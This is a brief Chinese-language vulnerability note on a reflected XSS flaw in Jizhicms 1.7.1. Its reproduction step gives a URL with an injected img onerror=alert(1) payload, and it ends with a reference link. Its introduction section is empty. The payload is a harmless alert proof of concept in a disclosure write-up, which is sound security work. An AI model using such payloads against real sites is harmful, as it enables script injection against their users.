# Jizhicms 1.7.1 反射型xss

## 一、漏洞简介

## 二、漏洞影响

Jizhicms 1.7.1

## 三、复现过程

```
http://www.baidu.com/static/default/assets/asset/img/1'%3Cimg%20src=1%20onerror=alert(1)%3E--

```

![9.png](images/2020_05_26/d56572532cd04dcd97b8b17442b5292c.png)

## 四、参考链接

> https://xz.aliyun.com/t/7775#toc-2

